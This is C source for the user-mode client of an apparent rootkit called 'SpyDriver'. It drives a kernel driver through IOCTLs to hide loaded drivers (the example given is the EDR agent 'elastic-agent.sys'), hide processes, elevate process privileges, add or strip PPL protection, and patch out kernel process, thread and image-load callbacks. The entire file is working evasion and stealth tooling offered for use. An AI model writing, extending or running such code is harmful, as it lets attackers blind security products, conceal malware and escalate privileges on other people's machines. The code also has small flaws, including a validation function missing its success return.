#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "common.h"


BOOL SendIOCTL(DWORD ioctlCode, PVOID inputBuffer, DWORD inputSize, PVOID outputBuffer, DWORD outputSize)
{
    HANDLE hDevice = CreateFileW(DRIVER_LINK, GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        printf("[!] Failed to open driver. Error: %lu\n", err);
        if (err == ERROR_ACCESS_DENIED) {
            printf("[!] Run as Administrator\n");
        }
        else if (err == ERROR_FILE_NOT_FOUND) {
            printf("[!] Driver not loaded. Run: sc start SpyDriver\n");
        }
        return FALSE;
    }

    DWORD bytesReturned = 0;
    BOOL result = DeviceIoControl(hDevice, ioctlCode, inputBuffer, inputSize,
        outputBuffer, outputSize, &bytesReturned, NULL);

    if (result) {
        if (bytesReturned > 0 && outputBuffer != NULL) {
            printf("%.*s", (int)bytesReturned, (char*)outputBuffer);
        }
    }
    else {
        printf("[!] IOCTL failed. Error: %lu\n", GetLastError());
    }

    CloseHandle(hDevice);
    return result;
}

void Art() {
    printf("\n");
    printf("_________             ________        .__                     _________ .__  .__               __\n");
    printf("/   _____/_____ ___.__.\\______ \\_______|__|__  __ ___________  \\_   ___ \|  | |__| ____   _____/  |_\n");
    printf("\\_____  \\\\____ <   |  | |    |  \\_  __ \\  \\  \\/ // __ \\_  __ \\ /    \\  \\/|  | |  |/ __ \\ /    \\   __\n");
    printf("/        \\  |_> >___  | |    `   \\  | \\/  |\\   /\\  ___/|  | \\/ \\     \\___|  |_|  \\  ___/|   |  \\  |\n");
    printf("/_______  /   __// ____|/_______  /__|  |__| \\_/  \\___  >__|     \\______  /____/__|\\___  >___|  /__|\n");
    printf("        \\/|__|   \\/             \\/                    \\/                \\/             \\/     \\/\n");
    printf("    @byIppY0kai\n");
    printf("\n");

}
void PrintUsage(const char* progName)
{
    printf("Usage: %s <category> <action> [options]\n\n", progName);
}

BOOL ConversionGuard(const CHAR* str) {
	ULONG i = 0;
	i = ParsePidFromString(str);
    if (i == 0) {
        printf("[!] Invalid PID: %s\n", str);
		return FALSE;
    }
}

int HandleCallbackCommand(int argc, char* argv[], char* buffer)
{
    if (argc < 3) {
        printf("[!] Missing action for callback category\n");
        printf("Usage: %s callback --list|--patch \n", argv[0]);
        return 1;
    }

    const char* action = argv[2];

    // Action: --patch
    if (strcmp(action, "--patch") == 0) {
        if (argc != 6 || strcmp(argv[4], "--type") != 0) {
            printf("[-] Usage: %s --patch <id> --type <0,1,2>\n", argv[0]);
            return -1;
        }
        printf("");
        const char* callbackIdStr = argv[3];
        const char* typeStr = argv[5];

        ULONG callbackIndex = strtoul(callbackIdStr, NULL, 10);
        ULONG callbackType = strtoul(typeStr, NULL, 10);
        if (callbackType > 2) {
           /* printf("[-] Invalid callback type: %lu. Must be 0=Process, 1=Thread, 2=LoadImage\n", callbackType);*/
            return -1;
        }

        //printf("[*] Patching kernel callback: index=%lu, type=%lu\n", callbackIndex, callbackType);

        SPY_PATCH_INPUT input = { 0 };
        input.Index = callbackIndex;
        input.Type = callbackType;

        memcpy(buffer, &input, sizeof(input));
        SendIOCTL(IOCTL_SPY_PATCH, buffer, sizeof(input), buffer, BUFFER_SIZE);

        return 0;
    }
    
    // Action: --list
    else if (strcmp(action, "--list") == 0) {
        SendIOCTL(IOCTL_SPY_PCALLBACK, NULL, 0, buffer, BUFFER_SIZE);
        printf("\n");
        SendIOCTL(IOCTL_SPY_TCALLBACK, NULL, 0, buffer, BUFFER_SIZE);
        printf("\n");
        SendIOCTL(IOCTL_SPY_ICALLBACK, NULL, 0, buffer, BUFFER_SIZE);
        return 0;
    }
    // Unknown action
    else {
        printf("[!] Unknown driver action: %s\n", action);
        printf("Valid actions: --list, --patch\n");
        return 1;
    }
}

int HandleDriverCommand(int argc, char* argv[], char* buffer)
{   
    if (argc < 3) {
        printf("[!] Missing action for driver category\n");
        printf("Usage: %s driver --list|--hide|--callback\n", argv[0]);
        return 1;
    }

    const char* action = argv[2];

    // Action: --list
    if (strcmp(action, "--list") == 0) {
        printf("[*] Listing all loaded kernel drivers...\n\n");
        SendIOCTL(IOCTL_SPY_DLIST, NULL, 0, buffer, BUFFER_SIZE);
        return 0;
    }
    // Action: --hide <driver.sys>
    else if (strcmp(action, "--hide") == 0) {
        if (argc < 4) {
            printf("[!] Missing driver name\n");
            printf("Usage: %s driver --hide <driver.sys>\n", argv[0]);
            printf("Example: %s driver --hide elastic-agent.sys\n", argv[0]);
            return 1;
        }

        const char* driverName = argv[3];

        // Prepare input structure
        SPY_HIDE_INPUT input = { 0 };
        strncpy_s(input.g_Name, sizeof(input.g_Name), driverName, _TRUNCATE);

        memcpy(buffer, &input, sizeof(input));
        SendIOCTL(IOCTL_SPY_DHIDE, buffer, sizeof(input), buffer, BUFFER_SIZE);
        return 0;
    }

    // Unknown action
    else {
        printf("[!] Unknown driver action: %s\n", action);
        printf("Valid actions: --list, --hide\n");
        return 1;
    }
}

int HandleProcessCommand(int argc, char* argv[], char* buffer)
{
    if (argc < 3) {
        printf("[!] Missing action for process category\n");
        printf("Usage: %s process --list|--hide|--kill|--elevate|--ppl\n", argv[0]);
        return 1;
    }

    const char* action = argv[2];

    // Action --list
    if (strcmp(action, "--list") == 0) {
        SendIOCTL(IOCTL_SPY_PLIST, NULL, 0, buffer, BUFFER_SIZE);
        return 0;
    }
    // Action: --hide <pid>
    else if (strcmp(action, "--hide") == 0) {
        if (argc < 4) {
            printf("[!] Missing driver name\n");
            printf("Usage: %s process --hide <pid>\n", argv[0]);
            printf("Example: %s process --hide 123\n", argv[0]);
            return 1;
        }

        const char* processPid = argv[3];
        /*printf("[*] Hiding process: %s\n\n", processPid);*/

        // Prepare input structure
        SPY_HIDE_INPUT input = { 0 };
        strncpy_s(input.g_Name, sizeof(input.g_Name), processPid, _TRUNCATE);
		// guard conversion
		if (!ConversionGuard(processPid)) return 1;
        // Copy input to start of buffer, output will overwrite
        memcpy(buffer, &input, sizeof(input));
        SendIOCTL(IOCTL_SPY_PHIDE, buffer, sizeof(input), buffer, BUFFER_SIZE);
        return 0;
    }

    // Action: --elevate <pid>
    else if (strcmp(action, "--elevate") == 0) {
        if (argc < 4) {
            printf("[!] Missing process name\n");
            printf("Usage: %s process --elevate <pid>\n", argv[0]);
            printf("Example: %s process --elevate 123\n", argv[0]);
            return 1;
        }

        const char* processPid = argv[3];

        SPY_HIDE_INPUT input = { 0 };
        strncpy_s(input.g_Name, sizeof(input.g_Name), processPid, _TRUNCATE);
        // guard conversion
        if (!ConversionGuard(processPid)) return 1;
		// Copy input to start of buffer, output will overwrite
        memcpy(buffer, &input, sizeof(input));
        SendIOCTL(IOCTL_SPY_UPDATE, buffer, sizeof(input), buffer, BUFFER_SIZE);
        return 0;
    }
    
    // Action: --ppl <pid>
    else if (strcmp(action, "--ppl") == 0) {
        if (argc < 4) {
            printf("[!] Missing process name\n");
            printf("Usage: %s process --ppl <pid>\n", argv[0]);
            printf("Example: %s process --ppl 123\n", argv[0]);
            return 1;
        }

        const char* processPid = argv[3];

        SPY_HIDE_INPUT input = { 0 };
        strncpy_s(input.g_Name, sizeof(input.g_Name), processPid, _TRUNCATE);
        // guard conversion
        if (!ConversionGuard(processPid)) return 1;
        // Copy input to start of buffer, output will overwrite
        memcpy(buffer, &input, sizeof(input));
        SendIOCTL(IOCTL_SPY_PPL, buffer, sizeof(input), buffer, BUFFER_SIZE);
        return 0;
    }

	// action: --unppl <pid>
    else if (strcmp(action, "--unppl") == 0) {
        if (argc < 4) {
            printf("[!] Missing process name\n");
            printf("Usage: %s process --ppl <pid>\n", argv[0]);
            printf("Example: %s process --ppl 123\n", argv[0]);
            return 1;
        }

        const char* processPid = argv[3];

        SPY_HIDE_INPUT input = { 0 };
        strncpy_s(input.g_Name, sizeof(input.g_Name), processPid, _TRUNCATE);
        // guard conversion
        if (!ConversionGuard(processPid)) return 1;
        // Copy input to start of buffer, output will overwrite
        memcpy(buffer, &input, sizeof(input));
        SendIOCTL(IOCTL_SPY_UNPPL, buffer, sizeof(input), buffer, BUFFER_SIZE);
        return 0;
    }
    else {
        printf("[!] Unknown process action: %s\n", action);
        printf("Valid actions: --list, --hide, --elevate, --ppl, --unppl\n");
        return 1;
	}
    return 0;
}

int main(int argc, char* argv[])
{
    if (argc < 2) {
        PrintUsage(argv[0]);
        return 1;
    }
    
	Art();
    printf("");
    // Allocate buffer
    char* buffer = (char*)malloc(BUFFER_SIZE);
    if (!buffer) {
        printf("[!] Failed to allocate buffer\n");
        return 1;
    }
    ZeroMemory(buffer, BUFFER_SIZE);

    const char* category = argv[1];
    int result = 0;

    // Category: driver
    if (strcmp(category, "driver") == 0) {
        result = HandleDriverCommand(argc, argv, buffer);
    }
    // Category: process
    else if (strcmp(category, "process") == 0) {
        result = HandleProcessCommand(argc, argv, buffer);
    }
    else if (strcmp(category, "callback") == 0) {
        result = HandleCallbackCommand(argc, argv, buffer);
    }
    // Unknown category
    else {
        printf("[!] Unknown category: %s\n", category);
        PrintUsage(argv[0]);
        result = 1;
    }
    printf("\n");
    free(buffer);
    return result;
}